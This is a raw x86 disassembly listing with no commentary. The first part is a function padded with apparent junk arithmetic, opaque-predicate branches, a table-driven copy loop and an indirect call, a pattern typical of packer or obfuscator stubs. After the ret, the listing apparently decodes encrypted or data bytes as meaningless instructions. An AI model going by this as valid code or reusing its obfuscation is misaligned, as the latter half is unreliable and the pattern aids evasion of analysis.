  408042:	add    DWORD PTR [ebp-0x14],edi
  408045:	sub    ebx,esi
  408047:	and    ebx,edx
  408049:	cmp    ebx,edx
  40804b:	je     0x40807c
  40804d:	mov    ecx,0xef
  408052:	mov    esi,0x11
  408057:	sub    DWORD PTR [ebp-0x14],ebx
  40805a:	or     esi,ebx
  40805c:	test   esi,0x93
  408062:	je     0x40807c
  408064:	mov    ebx,DWORD PTR [ebp-0x14]
  408067:	mov    eax,DWORD PTR [ebp-0x14]
  40806a:	cmp    esi,0xffffffed
  40806d:	jne    0x40807c
  40806f:	add    eax,ecx
  408071:	sub    esi,ecx
  408073:	sub    DWORD PTR [ebp-0x14],esi
  408076:	add    DWORD PTR [ebp-0x14],eax
  408079:	sub    DWORD PTR [ebp-0x14],ebx
  40807c:	sub    edi,0x45255522
  408082:	sub    DWORD PTR [ebp-0x14],edi
  408085:	call   DWORD PTR [edi]
  408087:	mov    ecx,esi
  408089:	mov    ebx,0x95
  40808e:	cmp    ecx,0x1a
  408091:	je     0x4081da
  408097:	mov    esi,0x5d
  40809c:	add    DWORD PTR [ebp-0x14],ebx
  40809f:	add    esi,ecx
  4080a1:	mov    edx,0x31
  4080a6:	sub    esi,ebx
  4080a8:	sub    edx,edi
  4080aa:	cmp    esi,DWORD PTR [ebp-0x30]
  4080ad:	je     0x4081da
  4080b3:	sub    esi,ecx
  4080b5:	mov    edi,DWORD PTR [ebp-0x14]
  4080b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4080bb:	cmp    ecx,0xffffffff
  4080be:	jne    0x4081da
  4080c4:	mov    ebx,0x94
  4080c9:	xor    edx,edx
  4080cb:	sub    DWORD PTR [ebp-0x14],ebx
  4080ce:	add    DWORD PTR [ebp-0x14],edi
  4080d1:	cmp    esi,DWORD PTR [ebp-0x38]
  4080d4:	je     0x4081da
  4080da:	mov    ebx,0xd029
  4080df:	mov    ebx,DWORD PTR [ebp-0x14]
  4080e2:	sub    edx,esi
  4080e4:	sub    DWORD PTR [ebp-0x14],ecx
  4080e7:	test   edx,0x8e
  4080ed:	jne    0x4081da
  4080f3:	mov    ecx,DWORD PTR [ebp-0x14]
  4080f6:	test   edx,0xc0
  4080fc:	je     0x4081da
  408102:	mov    esi,DWORD PTR [ebp-0x14]
  408105:	mov    edi,0x2e
  40810a:	cmp    esi,0xffffff9f
  40810d:	je     0x4081da
  408113:	cmp    edx,ebx
  408115:	je     0x4081da
  40811b:	cmp    ebx,edx
  40811d:	jne    0x4081da
  408123:	or     DWORD PTR [ebp-0x14],ecx
  408126:	or     DWORD PTR [ebp-0x14],edx
  408129:	cmp    esi,0xffffffda
  40812c:	jne    0x4081da
  408132:	cmp    ebx,DWORD PTR [ebp-0x48]
  408135:	jne    0x4081da
  40813b:	test   esi,0x41
  408141:	je     0x4081da
  408147:	cmp    esi,0x37
  40814a:	je     0x4081da
  408150:	mov    edi,0x1d
  408155:	mov    ecx,DWORD PTR [ebp-0x14]
  408158:	test   ecx,0x6c94
  40815e:	jne    0x4081da
  408160:	mov    edx,DWORD PTR [ebp-0x14]
  408163:	sub    DWORD PTR [ebp-0x14],edx
  408166:	sub    DWORD PTR [ebp-0x14],edi
  408169:	sub    ecx,edx
  40816b:	add    DWORD PTR [ebp-0x14],ecx
  40816e:	cmp    ecx,edi
  408170:	jne    0x4081da
  408172:	cmp    esi,0xfffffff2
  408175:	jne    0x4081da
  408177:	add    ebx,edx
  408179:	mov    edi,0xb8b5
  40817e:	test   esi,0xcbad
  408184:	je     0x4081da
  408186:	xor    DWORD PTR [ebp-0x14],ecx
  408189:	add    DWORD PTR [ebp-0x14],esi
  40818c:	add    edi,eax
  40818e:	cmp    ebx,DWORD PTR [ebp-0x40]
  408191:	je     0x4081da
  408193:	mov    ecx,DWORD PTR [ebp-0x14]
  408196:	add    ecx,esi
  408198:	mov    edx,0xc78b
  40819d:	sub    edi,esi
  40819f:	add    ecx,edi
  4081a1:	cmp    eax,DWORD PTR [ebp-0x14]
  4081a4:	je     0x4081da
  4081a6:	add    ebx,eax
  4081a8:	mov    DWORD PTR [ebp-0x14],ebx
  4081ab:	cmp    esi,edi
  4081ad:	je     0x4081da
  4081af:	add    edx,esi
  4081b1:	and    edx,ecx
  4081b3:	mov    ecx,0x9ad2
  4081b8:	mov    edi,0xe1
  4081bd:	add    DWORD PTR [ebp-0x14],ecx
  4081c0:	cmp    edx,0xf057
  4081c6:	jne    0x4081da
  4081c8:	cmp    edx,0xc30358c4
  4081ce:	jne    0x4081da
  4081d0:	cmp    edx,0xffffffba
  4081d3:	je     0x4081da
  4081d5:	sub    edi,edx
  4081d7:	and    DWORD PTR [ebp-0x14],edi
  4081da:	mov    DWORD PTR [ebp-0x8],eax
  4081dd:	add    DWORD PTR [ebp-0x14],esi
  4081e0:	mov    ebx,0x79d34d2
  4081e5:	mov    esi,0x26
  4081ea:	mov    edi,0xc5
  4081ef:	sub    DWORD PTR [ebp-0x14],esi
  4081f2:	add    DWORD PTR [ebp-0x14],ebx
  4081f5:	cmp    edx,ecx
  4081f7:	jne    0x4081fc
  4081f9:	add    DWORD PTR [ebp-0x14],edi
  4081fc:	add    ebx,0xf8a61b2e
  408202:	sub    DWORD PTR [ebp-0x14],ebx
  408205:	mov    DWORD PTR [ebp-0x2c],ebx
  408208:	sub    DWORD PTR [ebp-0x14],esi
  40820b:	mov    edi,DWORD PTR [ebp-0x8]
  40820e:	cmp    edi,0x5d
  408211:	je     0x40824f
  408213:	mov    ecx,0x3c
  408218:	mov    esi,0x29
  40821d:	sub    DWORD PTR [ebp-0x14],esi
  408220:	and    ebx,esi
  408222:	or     ecx,esi
  408224:	cmp    eax,DWORD PTR [ebp-0x4c]
  408227:	je     0x40824f
  408229:	mov    edx,edi
  40822b:	mov    eax,DWORD PTR [ebp-0x14]
  40822e:	sub    edx,ebx
  408230:	sub    DWORD PTR [ebp-0x14],edx
  408233:	sub    ecx,esi
  408235:	cmp    eax,DWORD PTR [ebp-0x24]
  408238:	je     0x40824f
  40823a:	mov    DWORD PTR [ebp-0x14],eax
  40823d:	mov    ebx,DWORD PTR [ebp-0x14]
  408240:	cmp    ebx,edi
  408242:	je     0x40824f
  408244:	add    DWORD PTR [ebp-0x14],ebx
  408247:	add    edx,eax
  408249:	add    DWORD PTR [ebp-0x14],edx
  40824c:	mov    DWORD PTR [ebp-0x14],ecx
  40824f:	mov    ebx,0x14
  408254:	mov    esi,DWORD PTR [ebp-0x14]
  408257:	test   esi,0xd4
  40825d:	jne    0x4082cb
  40825f:	and    ebx,edi
  408261:	xor    edx,edx
  408263:	sub    ebx,ecx
  408265:	xor    ecx,ecx
  408267:	cmp    ebx,DWORD PTR [ebp-0x38]
  40826a:	je     0x4082cb
  40826c:	xor    ecx,ecx
  40826e:	cmp    ebx,0xffffffa4
  408271:	jne    0x4082cb
  408273:	and    DWORD PTR [ebp-0x14],ebx
  408276:	mov    ebx,0xaa
  40827b:	sub    ebx,edi
  40827d:	and    esi,ebx
  40827f:	sub    DWORD PTR [ebp-0x14],esi
  408282:	cmp    ebx,0xfffffff0
  408285:	jne    0x4082cb
  408287:	mov    DWORD PTR [ebp-0x14],ecx
  40828a:	mov    ecx,eax
  40828c:	mov    esi,DWORD PTR [ebp-0x14]
  40828f:	sub    esi,eax
  408291:	add    ecx,ebx
  408293:	sub    edx,esi
  408295:	mov    DWORD PTR [ebp-0x14],edx
  408298:	sub    DWORD PTR [ebp-0x14],ebx
  40829b:	sub    ecx,eax
  40829d:	cmp    edi,0xc2ae
  4082a3:	je     0x4082cb
  4082a5:	and    ecx,edi
  4082a7:	cmp    ecx,0x48
  4082aa:	je     0x4082cb
  4082ac:	cmp    esi,0x78
  4082af:	je     0x4082cb
  4082b1:	mov    esi,DWORD PTR [ebp-0x14]
  4082b4:	and    DWORD PTR [ebp-0x14],ecx
  4082b7:	mov    edx,ebx
  4082b9:	xor    DWORD PTR [ebp-0x14],edx
  4082bc:	sub    esi,ecx
  4082be:	test   esi,0xcddd
  4082c4:	je     0x4082cb
  4082c6:	sub    esi,edx
  4082c8:	and    DWORD PTR [ebp-0x14],esi
  4082cb:	mov    ebx,DWORD PTR [ebp-0x2c]
  4082ce:	add    edx,ebx
  4082d0:	or     DWORD PTR [ebp-0x14],edx
  4082d3:	mov    esi,DWORD PTR [ebx]
  4082d5:	add    DWORD PTR [ebp-0x14],esi
  4082d8:	mov    ecx,DWORD PTR [ebx+0x4]
  4082db:	or     esi,esi
  4082dd:	je     0x40831f
  4082df:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082e1:	sub    esi,edi
  4082e3:	add    esi,esi
  4082e5:	add    DWORD PTR [ebp-0x14],ecx
  4082e8:	cmp    esi,ecx
  4082ea:	jne    0x408313
  4082ec:	and    esi,eax
  4082ee:	test   esi,0x9a
  4082f4:	je     0x408313
  4082f6:	cmp    esi,0x5ed4
  4082fc:	je     0x408313
  4082fe:	test   esi,0x37
  408304:	je     0x408313
  408306:	cmp    esi,DWORD PTR [ebp-0x30]
  408309:	je     0x408313
  40830b:	cmp    esi,0x2c
  40830e:	je     0x408313
  408310:	sub    DWORD PTR [ebp-0x14],esi
  408313:	add    DWORD PTR [ebp-0x2c],0x8
  408317:	add    DWORD PTR [ebp-0x14],eax
  40831a:	jmp    0x40820e
  40831f:	mov    edi,DWORD PTR [ebp-0x14]
  408322:	mov    edx,0x1d
  408327:	or     DWORD PTR [ebp-0x14],eax
  40832a:	cmp    edi,0xfffffffd
  40832d:	jne    0x408348
  40832f:	and    ecx,edx
  408331:	mov    edx,DWORD PTR [ebp-0x14]
  408334:	add    DWORD PTR [ebp-0x14],esi
  408337:	xor    DWORD PTR [ebp-0x14],edi
  40833a:	sub    DWORD PTR [ebp-0x14],ecx
  40833d:	sub    edx,ecx
  40833f:	mov    eax,DWORD PTR [ebp-0x14]
  408342:	and    DWORD PTR [ebp-0x14],eax
  408345:	sub    DWORD PTR [ebp-0x14],edx
  408348:	sub    eax,edi
  40834a:	and    eax,ecx
  40834c:	mov    edx,DWORD PTR [ebp-0x14]
  40834f:	add    edx,ecx
  408351:	mov    edi,DWORD PTR [ebp-0x14]
  408354:	cmp    eax,DWORD PTR [ebp-0x34]
  408357:	je     0x408371
  408359:	cmp    edx,0x21
  40835c:	jne    0x408371
  40835e:	xor    DWORD PTR [ebp-0x14],edi
  408361:	test   edx,0x88
  408367:	je     0x408371
  408369:	sub    eax,edi
  40836b:	sub    DWORD PTR [ebp-0x14],edx
  40836e:	mov    DWORD PTR [ebp-0x14],eax
  408371:	mov    eax,DWORD PTR [ebp-0x8]
  408374:	cmp    eax,0xffffffb6
  408377:	je     0x4083c3
  408379:	mov    edx,DWORD PTR [ebp-0x14]
  40837c:	mov    edi,DWORD PTR [ebp-0x14]
  40837f:	add    edi,ecx
  408381:	cmp    edx,0xe3ec
  408387:	je     0x4083c3
  408389:	mov    esi,DWORD PTR [ebp-0x14]
  40838c:	mov    ecx,DWORD PTR [ebp-0x14]
  40838f:	add    ecx,edi
  408391:	add    ecx,edi
  408393:	add    esi,esi
  408395:	add    ecx,ecx
  408397:	and    edx,edi
  408399:	cmp    edx,eax
  40839b:	jne    0x4083c3
  40839d:	sub    DWORD PTR [ebp-0x14],eax
  4083a0:	and    edx,edi
  4083a2:	cmp    ecx,0x3e
  4083a5:	jne    0x4083c3
  4083a7:	add    DWORD PTR [ebp-0x14],edx
  4083aa:	and    DWORD PTR [ebp-0x14],esi
  4083ad:	sub    ecx,esi
  4083af:	test   ecx,0xb0
  4083b5:	jne    0x4083c3
  4083b7:	mov    edx,DWORD PTR [ebp-0x14]
  4083ba:	add    DWORD PTR [ebp-0x14],ecx
  4083bd:	xor    DWORD PTR [ebp-0x14],eax
  4083c0:	sub    DWORD PTR [ebp-0x14],edx
  4083c3:	xor    ebx,ebx
  4083c5:	sub    DWORD PTR [ebp-0x14],ebx
  4083c8:	pop    edi
  4083c9:	cmp    eax,DWORD PTR [ebp-0x10]
  4083cc:	jne    0x4083d1
  4083ce:	sub    DWORD PTR [ebp-0x14],edi
  4083d1:	pop    esi
  4083d2:	or     DWORD PTR [ebp-0x14],esi
  4083d5:	pop    ebx
  4083d6:	cmp    ebx,0xffffffdd
  4083d9:	je     0x4083de
  4083db:	add    DWORD PTR [ebp-0x14],ebx
  4083de:	leave  
  4083df:	ret    
  4083e0:	inc    esi
  4083e1:	gs daa 
  4083e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083e4:	and    al,0xc
  4083e6:	jns    0x4083fb
  4083e8:	xchg   esp,eax
  4083e9:	mov    al,ds:0xc0458309
  4083ee:	int    0xda
  4083f0:	push   eax
  4083f1:	jae    0x4083b2
  4083f3:	push   eax
  4083f4:	xor    DWORD PTR ds:0xa322386e,edi
  4083fa:	fxch   st(4)
  4083fc:	dec    esi
  4083fd:	fisttp QWORD PTR [esi-0x2128bb01]
  408403:	into   
  408404:	dec    edx
  408405:	lods   eax,DWORD PTR ds:[esi]
  408406:	fxch   st(3)
  408408:	inc    edi
  408409:	cmp    dl,cl
  40840b:	aaa    
  40840c:	jmp    0x6e1d:0xbe77e638
  408413:	jp     0x4083fe
  408415:	cmp    dl,dh
  408417:	test   DWORD PTR [ecx],0xf5386ef4
  40841d:	cmp    cl,dl
  40841f:	fld    QWORD PTR [edi-0x2a]
  408422:	retf   
  408423:	aam    0x38
  408425:	jmp    0xca6e:0xd441dc9c
  40842c:	jns    0x40840a
  40842e:	rcl    ah,cl
  408430:	add    ebx,esp
  408432:	rcl    ah,cl
  408434:	cmc    
  408435:	iret   
  408436:	icebp  
  408437:	push   esp
  408438:	push   ebp
  408439:	in     eax,dx
  40843a:	cs mov ah,0x5a
  40843d:	xor    cl,dh
  40843f:	cmc    
  408440:	loope  0x408427
  408442:	ss ret 0xb5ef
  408446:	pusha  
  408447:	mov    edi,DWORD PTR [edx+0x27]
  40844a:	mov    esi,0x3014a4b7
  40844f:	inc    eax
  408450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408451:	in     eax,dx
  408452:	push   0x3f33b8fe
  408457:	push   ecx
  408458:	js     0x408499
  40845a:	fwait
  40845b:	sbb    BYTE PTR [eax+0x60],ch
  40845e:	pop    esp
  40845f:	cmp    esp,DWORD PTR [eax-0x3ea0a652]
  408465:	and    BYTE PTR [edi],bh
  408467:	mov    dh,0x29
  408469:	sbb    al,0x82
  40846b:	fldcw  WORD PTR [esi+0x5a38777d]
  408471:	mov    ch,0x52
  408473:	mov    esi,0x386d23a9
  408478:	hlt    
  408479:	(bad)  ds:0x6e39fdb2
  40847f:	cmp    ch,dh
  408481:	cmp    BYTE PTR [esi+0x38],ch
  408484:	push   0xe43876a7
  408489:	mov    esp,0x38f53915
  40848e:	icebp  
  40848f:	int    0xed
  408491:	mov    bh,0x23
  408493:	cmp    esp,esi
  408495:	cmp    BYTE PTR [esi-0x7a],ch
  408498:	cmc    
  408499:	cmp    ebp,DWORD PTR [esi+0x38]
  40849c:	and    edi,0xe4ebceaf
  4084a2:	rol    bl,0xf7
  4084a5:	adc    al,0x4e
  4084a7:	xchg   edi,eax
  4084a8:	out    dx,eax
  4084a9:	js     0x408486
  4084ab:	xor    DWORD PTR [esi],ebp
  4084ad:	or     edx,ebp
  4084af:	mov    esi,0x576e38f5
  4084b4:	int3   
  4084b5:	mov    dh,0x1b
  4084b7:	cmp    esp,esi
  4084b9:	cmp    BYTE PTR [esi+0x14],ch
  4084bc:	repz mov esp,0xad7b3e6d
  4084c2:	sar    BYTE PTR [eax],1
  4084c4:	pop    ebx
  4084c5:	push   eax
  4084c6:	sar    BYTE PTR [ebx],cl
  4084c8:	hlt    
  4084c9:	cmp    al,dh
  4084cb:	mov    ebp,0x386e39f1
  4084d0:	dec    ecx
  4084d1:	mov    ch,0x7b
  4084d3:	or     ch,dh
  4084d5:	cmp    BYTE PTR [esi-0x49],ch
  4084d8:	daa    
  4084d9:	xor    al,0xf1
  4084db:	out    dx,al
  4084dc:	loope  0x408493
  4084de:	inc    eax
  4084df:	push   esp
  4084e0:	jmp    0x408497
  4084e2:	js     0x4084eb
  4084e4:	fsubr  DWORD PTR [edi-0x17b84844]
  4084ea:	repz test ebp,esi
  4084ed:	cmp    DWORD PTR [esi+0x38],ebp
  4084f0:	mov    esi,0xf5386f3b
  4084f5:	xor    eax,0xd1cdcd64
  4084fa:	adc    eax,DWORD PTR ds:0x474aa36
  408500:	pop    edi
  408501:	mov    eax,ds:0x95d51468
  408506:	jo     0x408580
  408508:	jns    0x408549
  40850a:	mov    bh,0xcc
  40850c:	fst    DWORD PTR [ecx+edx*2-0x56]
  408510:	mov    edx,0xf4386d3b
  408515:	adc    al,0x6c
  408517:	mov    esp,0x7de43af4
  40851c:	dec    edi
  40851d:	cmp    ah,al
  40851f:	push   eax
  408520:	out    0x39,al
  408522:	outs   dx,BYTE PTR ds:[esi]
  408523:	cmp    BYTE PTR [eax],dh
  408525:	mov    edi,0x38f43b62
  40852a:	in     al,0x8d
  40852c:	pusha  
  40852d:	cli    
  40852e:	xchg   BYTE PTR [ecx+0x386d206a],dh
  408534:	hlt    
  408535:	(bad)  
  408537:	mov    ebp,0x386e39fd
  40853c:	scas   al,BYTE PTR es:[edi]
  40853d:	jge    0x4085aa
  40853f:	cmp    BYTE PTR [edx-0x4b],bl
  408542:	push   edx
  408543:	or     al,0xb5
  408545:	(bad)  [edi-0x4f531203]
  40854b:	mov    bh,0x52
  40854d:	xor    BYTE PTR [ecx-0x19],ch
  408550:	xor    DWORD PTR [ebp-0x38173f3f],esi
  408556:	jbe    0x40850f
  408558:	js     0x408572
  40855a:	imul   ecx,ebp,0x438eded
  408560:	pop    eax
  408561:	add    cl,bl
  408563:	or     DWORD PTR [edx+0x4f30ab3c],eax
  408569:	cmp    BYTE PTR [esi+0x6e39aa50],bh
  40856f:	cmp    BYTE PTR [esi],bh
  408571:	push   DWORD PTR [edx-0x34]
  408574:	call   0xa690d773
  408579:	pop    ebp
  40857a:	push   0xffffffef
  40857c:	or     DWORD PTR ds:0x61e430bb,edi
  408582:	imul   edi,DWORD PTR [ecx-0x2b],0x11ff693d
  408589:	cmp    eax,0x386030ab
  40858e:	imul   edi,ebp,0x1caab3ed
  408594:	adc    ebx,ebx
  408596:	aaa    
  408597:	jg     0x408586
  408599:	cmp    BYTE PTR [ebx-0x1bc73e49],bh
  40859f:	xor    al,0xf4
  4085a1:	scas   al,BYTE PTR es:[edi]
  4085a2:	jbe    0x4085f4
  4085a4:	popf   
  4085a5:	cmp    BYTE PTR [esi+0x38],ch
  4085a8:	scas   al,BYTE PTR es:[edi]
  4085a9:	mov    al,0x6a
  4085ab:	sbb    al,0x6c
  4085ad:	cld    
  4085ae:	mov    dh,BYTE PTR [eax]
  4085b0:	mov    bh,0x3f
  4085b2:	outs   dx,BYTE PTR ds:[esi]
  4085b3:	in     eax,dx
  4085b4:	pusha  
  4085b5:	push   esp
  4085b6:	jmp    0xf539:0x56dbc17c
  4085bd:	cmp    BYTE PTR [esi-0x47],ch
  4085c0:	add    DWORD PTR [eax+edi*8],ebx
  4085c3:	das    
  4085c4:	xor    eax,0x68b5c138
  4085c9:	es js  0x4085c4
  4085cc:	cmc    
  4085cd:	enter  0x9a56,0xf3
  4085d1:	cmp    BYTE PTR [esi-0x4a],ch
  4085d4:	sub    ah,BYTE PTR [edi+edx*8]
  4085d7:	arpl   WORD PTR [ebp-0x64],ax
  4085da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085db:	cmp    edi,DWORD PTR [edx+0x24]
  4085de:	push   edi
  4085df:	(bad)  
  4085e1:	cmp    BYTE PTR [esi-0x4a],ch
  4085e4:	sub    ah,BYTE PTR [eax]
  4085e6:	xlat   BYTE PTR ds:[ebx]
  4085e7:	mul    BYTE PTR [esi-0x7f]
  4085ea:	cmp    BYTE PTR gs:[edx+0x24],bh
  4085ee:	push   edi
  4085ef:	jmp    0x2c2a:0xb66e38f4
  4085f6:	repnz std 
  4085f8:	icebp  
  4085f9:	cmp    al,0xae
  4085fb:	add    al,0xe4
  4085fd:	popa   
  4085fe:	mov    edi,0x68fc622c
  408603:	and    BYTE PTR [eax-0x38],ah
  408606:	jb     0x408647
  408608:	pop    edx
  408609:	and    al,0xf0
  40860b:	in     eax,dx
  40860c:	lds    edi,FWORD PTR [esi+edi*4]
  40860f:	sub    BYTE PTR [esi-0x31],ch
  408612:	push   edx
  408613:	mov    ah,0x72
  408615:	push   esp
  408616:	repnz int 0xc5
  408619:	in     al,0x65
  40861b:	int    0x4a
  40861d:	xchg   esp,eax
  40861e:	mov    ds:0xf2217a50,al
  408623:	xor    ah,BYTE PTR [edx-0x4]
  408626:	sahf   
  408627:	cmp    al,0x30
  408629:	jmp    DWORD PTR [esi-0x3e]
  40862c:	shl    DWORD PTR [edx-0x71],0x38
  408630:	cmc    
  408631:	cmp    bl,dh
  408633:	loop   0x408627
  408635:	cmc    
  408636:	aam    0xb9
  408638:	aas    
  408639:	shl    BYTE PTR [edi-0x34],cl
  40863c:	jmp    0xdd94eb9b
  408641:	cmc    
  408642:	out    dx,al
  408643:	push   es
  408644:	int    0xae
  408646:	xchg   BYTE PTR [edi-0xb0cc4d1],dh
  40864c:	out    0x3f,al
  40864e:	mov    eax,ds:0x72adc5f5
  408653:	pop    es
  408654:	and    dl,BYTE PTR [edx+ebx*8+0x33]
  408658:	xor    bh,dh
  40865a:	pop    edx
  40865b:	int    0xf7
  40865d:	push   ebp
  40865e:	and    DWORD PTR [esi-0x570177c1],edi
  408664:	lods   al,BYTE PTR gs:[esi]
  408666:	test   BYTE PTR [edi+0x495e1ff7],dh
  40866c:	lds    ebp,FWORD PTR [ebx]
  40866e:	lods   al,BYTE PTR ds:[esi]
  40866f:	call   0xcdff4e99
  408674:	jmp    0x40862e
  408676:	loopne 0x4086b2
  408678:	shr    BYTE PTR [edi-0x4356a895],0x28
  40867f:	cmp    eax,0x71c84df4
  408684:	mov    bh,0x3f
  408686:	outs   dx,BYTE PTR ds:[esi]
  408687:	in     eax,dx
  408688:	pusha  
  408689:	push   esp
  40868a:	iret   
  40868b:	mov    bh,0x7a
  40868d:	xor    al,0xf1
  40868f:	(bad)
  408692:	sbb    DWORD PTR [ecx-0x73f4bac8],edi
  408698:	not    DWORD PTR [eax-0x24]
  40869b:	cmp    ch,dh
  40869d:	cmp    cl,bl
  40869f:	inc    edx
  4086a0:	cmp    BYTE PTR [ebx+0x57],dh
  4086a3:	(bad)  
  4086a5:	cmp    BYTE PTR [esi-0x31],ch
  4086a8:	adc    ebp,ebp
  4086aa:	cs push ecx
  4086ac:	push   eax
  4086ad:	cmp    BYTE PTR [esi+0x38],ch
  4086b0:	js     0x4086cf
  4086b2:	sbb    DWORD PTR [edi],edi
  4086b4:	ss push 0x3824507f
  4086ba:	outs   dx,BYTE PTR ds:[esi]
  4086bb:	cmp    bh,ah
  4086bd:	js     0x408699
  4086bf:	inc    ebx
  4086c0:	jp     0x4086bb
  4086c2:	adc    BYTE PTR [ecx+ebx*8+0x53],dl
  4086c6:	mov    esp,0x9138f538
  4086cb:	ja     0x408747
  4086cd:	or     BYTE PTR [esi-0x1],dl
  4086d0:	cmc    
  4086d1:	cmp    BYTE PTR [esi+0x57],ch
  4086d4:	or     eax,0x79513f94
  4086d9:	idiv   DWORD PTR [ecx+0x71]
  4086dc:	rol    BYTE PTR [edi],0xff
  4086df:	lock mov dh,0x5b
  4086e2:	ja     0x408678
  4086e4:	int    0x17
  4086e6:	outs   dx,BYTE PTR ds:[esi]
  4086e7:	cmp    ch,dh
  4086e9:	out    0x6e,eax
  4086eb:	(bad)
  4086ee:	fnstenv [esi]
  4086f0:	jne    0x408716
  4086f2:	je     0x4086c3
  4086f4:	jmp    0x4086b3
  4086f6:	mov    ax,0x3a7c
  4086fa:	scas   eax,DWORD PTR es:[edi]
  4086fb:	stc    
  4086fc:	call   0xf1ce:0xf68c2bb4
  408703:	inc    ebx
  408704:	add    BYTE PTR [eax],ch
  408706:	pop    edx
  408707:	popf   
  408708:	push   ebx
  408709:	push   ebp
  40870a:	std    
  40870b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40870d:	scas   al,BYTE PTR es:[edi]
  40870e:	imul   esi,DWORD PTR [esi+0x6e78fe1b],0xffffffa8
  408715:	in     al,dx
  408716:	aaa    
  408717:	dec    ch
  408719:	sub    DWORD PTR [esi+0x38],ebp
  40871c:	hlt    
  40871d:	or     al,0x37
  40871f:	push   ecx
  408720:	int3   
  408721:	cmp    BYTE PTR [esi+0x38],ch
  408724:	inc    edi
  408725:	sub    ch,BYTE PTR [edx]
  408727:	adc    al,0x71
  408729:	sbb    al,0x96
  40872b:	mov    cl,0x71
  40872d:	sbb    al,0x82
  40872f:	fldcw  WORD PTR [esi+0x5a38777d]
  408735:	mov    ch,0x52
  408737:	mov    esp,0xb7cf2ba9
  40873c:	sub    dh,BYTE PTR [eax]
  40873e:	mov    edi,DWORD PTR [eax]
  408740:	lds    edi,FWORD PTR [eax]
  408742:	outs   dx,BYTE PTR ds:[esi]
  408743:	shl    DWORD PTR [esi-0x20],cl
  408746:	mov    bl,0xe6
  408748:	jp     0x408757
  40874a:	icebp  
  40874b:	call   0x39a14281
  408750:	in     eax,0x38
  408752:	outs   dx,BYTE PTR ds:[esi]
  408753:	iret   
  408754:	in     eax,dx
  408755:	fsubp  st(7),st
  408757:	add    al,0xf7
  408759:	enter  0xccab,0xec
  40875d:	pop    ss
  40875e:	outs   dx,BYTE PTR ds:[esi]
  40875f:	sub    ch,dh
  408761:	cmp    BYTE PTR [ecx+0x58],dl
  408764:	outs   dx,BYTE PTR ds:[esi]
  408765:	push   DWORD PTR [esi+0x50]
  408768:	cmc    
  408769:	cmp    BYTE PTR [esi+0x38],ch
  40876c:	jbe    0x408782
  40876e:	mov    bh,bl
  408770:	sbb    bh,al
  408772:	outs   dx,BYTE PTR ds:[esi]
  408773:	out    0x62,eax
  408775:	mov    ebp,0x38352e5f
  40877a:	mov    esi,0x6e27c550
  40877f:	cmp    BYTE PTR [esi-0x1],ch
  408782:	pop    esi
  408783:	xchg   BYTE PTR ds:0xe8386e3e,cl
  408789:	mov    ch,0x43
  40878b:	cs xor eax,0xfdf5f738
  408791:	aad    0xae
  408793:	shl    ch,1
  408795:	call   0xd266c008
  40879a:	outs   dx,BYTE PTR ds:[esi]
  40879b:	shr    BYTE PTR [edi],1
  40879d:	aaa    
  40879e:	cmp    al,0x36
  4087a0:	hlt    
  4087a1:	scas   al,BYTE PTR es:[edi]
  4087a2:	pop    esi
  4087a3:	push   ecx
  4087a4:	(bad)  
  4087a5:	outs   dx,BYTE PTR es:[esi]
  4087a7:	cmp    BYTE PTR [esi-0x1],ch
  4087aa:	bound  ebp,QWORD PTR [edx-0x7878448]
  4087b0:	cmc    
  4087b1:	mov    ch,0xe3
  4087b3:	inc    esp
  4087b4:	pusha  
  4087b5:	mul    DWORD PTR [esi+0x3c]
  4087b8:	aam    0x14
  4087ba:	dec    esp
  4087bb:	dec    esp
  4087bc:	mov    DWORD PTR [esi-0x7e55f17],esi
  4087c2:	outs   dx,BYTE PTR ds:[esi]
  4087c3:	cmp    edx,ebp
  4087c5:	mov    dh,0x19
  4087c7:	push   ecx
  4087c8:	sbb    al,0xf8
  4087ca:	outs   dx,BYTE PTR ds:[esi]
  4087cb:	cmp    edi,DWORD PTR [eax-0xa0787ba]
  4087d1:	into   
  4087d2:	push   esi
  4087d3:	fcomi  st,st(1)
  4087d5:	cmp    BYTE PTR [esi+0x4],ch
  4087d8:	push   0xf5f8785b
  4087dd:	or     ebx,ebp
  4087df:	pop    ds
  4087e0:	idiv   DWORD PTR [eax]
  4087e2:	outs   dx,BYTE PTR ds:[esi]
  4087e3:	cmp    edi,DWORD PTR [eax-0xa0787a2]
  4087e9:	shr    BYTE PTR [esi+0x22ac06d0],cl
  4087ef:	mov    eax,0x515eaef4
  4087f4:	xchg   edi,eax
  4087f5:	outs   dx,BYTE PTR es:[esi]
  4087f7:	cmp    BYTE PTR [esi-0x1],ch
  4087fa:	pop    edx
  4087fb:	xor    al,0xb5
  4087fd:	or     dl,ch
  4087ff:	aas    
  408800:	idiv   DWORD PTR [eax]
  408802:	outs   dx,BYTE PTR ds:[esi]
  408803:	mov    bh,0xfd
  408805:	rol    ebp,0x50
  408808:	jo     0x408830
  40880a:	outs   dx,BYTE PTR ds:[esi]
  40880b:	cmp    BYTE PTR [eax],dh
  40880d:	mov    ebp,0x38352e4b
  408812:	jge    0x4087d1
  408814:	ret    
  408815:	cmp    ch,BYTE PTR [esi+0x38]
  408818:	and    eax,0xf12356c1
  40881d:	cmp    BYTE PTR [esi+0x4],ch
  408820:	push   0xf5f87853
  408825:	or     ebx,ebp
  408827:	idiv   BYTE PTR [bx+si]
  40882a:	outs   dx,BYTE PTR ds:[esi]
  40882b:	mov    bh,0x7a
  40882d:	xor    cl,dh
  40882f:	vpunpckldq xmm4,xmm0,XMMWORD PTR [ebx-0x58c70ac8]
  408837:	xor    al,0x3e
  408839:	stos   BYTE PTR es:[edi],al
  40883a:	push   0xdbb4894f
  40883f:	xor    BYTE PTR [eax-0x59],ah
  408842:	pop    edx
  408843:	cmp    al,0x74
  408845:	in     al,0x69
  408847:	ret    0xde31
  40884a:	icebp  
  40884b:	repnz sbb ebx,esi
  40884e:	div    ebx
  408850:	sbb    esi,DWORD PTR [ebp-0xc17b34d]
  408856:	mov    ds:0xd0ccf5d6,al
  40885b:	clc    
  40885c:	hlt    
  40885d:	stos   BYTE PTR es:[edi],al
  40885e:	mov    esi,0xd6307a3b
  408863:	or     eax,DWORD PTR [esi+edi*1+0x7e]
  408867:	cmp    edi,DWORD PTR [edx+0x28]
